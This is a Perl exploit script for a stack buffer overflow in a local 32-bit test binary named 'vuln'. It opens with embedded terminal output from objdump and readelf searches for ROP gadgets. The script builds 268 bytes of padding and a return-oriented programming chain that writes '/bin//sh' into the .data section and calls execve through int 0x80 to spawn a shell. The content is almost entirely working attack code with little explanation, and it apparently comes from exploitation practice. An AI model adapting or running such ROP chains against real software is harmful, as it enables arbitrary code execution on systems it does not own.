=c
m0nad@m0nad-notebook:~/projects/overflow/ROP/binary-test$ objdump -D  vuln | grep -E 'pop\s*%ecx' -A2 | grep ret -B2
 8053ed6:	59                   	pop    %ecx
 8053ed7:	5b                   	pop    %ebx
 8053ed8:	c3                   	ret    
--
--
 80cae04:	59                   	pop    %ecx
 80cae05:	c3                   	ret    
m0nad@m0nad-notebook:~/projects/overflow/ROP/binary-test$ objdump -D  vuln | grep -E 'pop\s*%edx' -A2 | grep ret -B2
 8053eac:	5a                   	pop    %edx
 8053ead:	c3                   	ret    
m0nad@m0nad-notebook:~/projects/overflow/ROP/binary-test$ objdump -D  vuln | grep -E 'pop\s*%edx' -A2 | grep ret -B2
 8053eac:	5a                   	pop    %edx
 8053ead:	c3                   	ret    
m0nad@m0nad-notebook:~/projects/overflow/ROP/binary-test$ objdump -D  vuln | grep -E 'pop\s*%ecx' -A2 | grep ret -B2
 8053ed6:	59                   	pop    %ecx
 8053ed7:	5b                   	pop    %ebx
 8053ed8:	c3                   	ret    
--
--
 80cae04:	59                   	pop    %ecx
 80cae05:	c3                   	ret    
m0nad@m0nad-notebook:~/projects/overflow/ROP/binary-test$ objdump -D  vuln | grep -E 'pop\s*%eax' -A2 | grep ret -B2
 80cc415:	58                   	pop    %eax
 80cc416:	03 0a                	add    (%edx),%ecx
 80cc418:	c3                   	ret    
m0nad@m0nad-notebook:~/projects/overflow/ROP/binary-test$ objdump -D  vuln | grep -E 'xor\s*%eax,%eax' -A1 | grep ret -B1
 8051be1:	31 c0                	xor    %eax,%eax
 8051be3:	c3                   	ret    
--
 8051c00:	31 c0                	xor    %eax,%eax
 8051c02:	c3                   	ret    
--
 806d2f4:	31 c0                	xor    %eax,%eax
 806d2f6:	c3                   	ret    
--
 8070f9a:	31 c0                	xor    %eax,%eax
 8070f9c:	c3                   	ret    
--
 8071140:	31 c0                	xor    %eax,%eax
 8071142:	c3                   	ret    
--
 809d40f:	31 c0                	xor    %eax,%eax
 809d411:	c3                   	ret    
m0nad@m0nad-notebook:~/projects/overflow/ROP/binary-test$ objdump -D  vuln | grep -E 'mov\s*%eax,\(%edx\)' -A1 | grep ret -B1
 8080391:	89 02                	mov    %eax,(%edx)
 8080393:	c3                   	ret    
m0nad@m0nad-notebook:~/projects/overflow/ROP/binary-test$ objdump -D  vuln | grep -E 'mov\s*%edx,%eax' -A1 | grep ret -B1
 80770ac:	89 d0                	mov    %edx,%eax
 80770ae:	f3 c3                	repz ret 
--
 80aa9a7:	89 d0                	mov    %edx,%eax
 80aa9a9:	c3                   	ret    
m0nad@m0nad-notebook:~/projects/overflow/ROP/binary-test$ objdump -D  vuln | grep -E 'int\s*\$0x80'
 80487bf:	cd 80                	int    $0x80
 8052f2c:	cd 80                	int    $0x80
 8053fa8:	cd 80                	int    $0x80
 80545f0:	cd 80                	int    $0x80
 8077023:	cd 80                	int    $0x80
 807a5c8:	cd 80                	int    $0x80
 808b355:	cd 80                	int    $0x80
 808b35e:	cd 80                	int    $0x80
m0nad@m0nad-notebook:~/projects/overflow/ROP/binary-test$ objdump -D  vuln | grep -E 'inc\s*%eax' -A1 | grep ret -B1
 806d84f:	40                   	inc    %eax
 806d850:	c3                   	ret    
--
 80c9dc3:	40                   	inc    %eax
 80c9dc4:	c3                   	ret    
--
 80cbd20:	40                   	inc    %eax
 80cbd21:	ca fa ff             	lret   $0xfffa
--
 80cefab:	ff c0                	inc    %eax
 80cefad:	cf                   	iret   
m0nad@m0nad-notebook:~/projects/overflow/ROP/binary-test$ readelf -S vuln | grep 22
  [22] .data             PROGBITS        080cf020 086020 000740 00  WA  0   0 32
m0nad@m0nad-notebook:~/projects/overflow/ROP/binary-test$ 
=cut
#!/usr/bin/perl
use strict;

my $p = "a" x 268;
# execve /bin/sh

$p .= pack("I", 0x08053eac); # pop %edx | ret
$p .= "/bin";
$p .= pack("I", 0x080aa9a7); # mov %edx,%eax | ret
#eax = /bin
$p .= pack("I", 0x08053eac); # pop %edx | ret
$p .= pack("I", 0x080cf020); # @ .data
$p .= pack("I", 0x08080391); # mov %eax,(%edx) | ret
#data = /bin

$p .= pack("I", 0x08053eac); # pop %edx | ret
$p .= "//sh";
$p .= pack("I", 0x080aa9a7); # mov %edx,%eax | ret
#eax = //sh

$p .= pack("I", 0x08053eac); # pop %edx | ret
$p .= pack("I", 0x080cf024); # @ .data + 4
$p .= pack("I", 0x08080391); # mov %eax,(%edx) | ret
#data = /bin//sh

$p .= pack("I", 0x08053eac); # pop %edx | ret
$p .= pack("I", 0x080cf028); # @ .data + 8
$p .= pack("I", 0x0809d40f); # xor %eax,%eax | ret
$p .= pack("I", 0x08080391); # mov %eax,(%edx) | ret
#data = /bin//sh\0

$p .= pack("I", 0x08053ed6); #pop %ecx | pop %ebx | ret
$p .= pack("I", 0x080cf028); # @ .data + 8
$p .= pack("I", 0x080cf020); # @ .data
$p .= pack("I", 0x08053eac); # pop %edx | ret
$p .= pack("I", 0x080cf028); # @ .data + 8
#("/bin//sh", NULL, NULL);

$p .= pack("I", 0x0809d40f); # xor %eax,%eax | ret
$p .= pack("I", 0x0806d84f); # inc %eax | ret
$p .= pack("I", 0x0806d84f); # inc %eax | ret
$p .= pack("I", 0x0806d84f); # inc %eax | ret
$p .= pack("I", 0x0806d84f); # inc %eax | ret
$p .= pack("I", 0x0806d84f); # inc %eax | ret
$p .= pack("I", 0x0806d84f); # inc %eax | ret
$p .= pack("I", 0x0806d84f); # inc %eax | ret
$p .= pack("I", 0x0806d84f); # inc %eax | ret
$p .= pack("I", 0x0806d84f); # inc %eax | ret
$p .= pack("I", 0x0806d84f); # inc %eax | ret
$p .= pack("I", 0x0806d84f); # inc %eax | ret
$p .= pack("I", 0x0808b35e); # int $0x80
print $p;

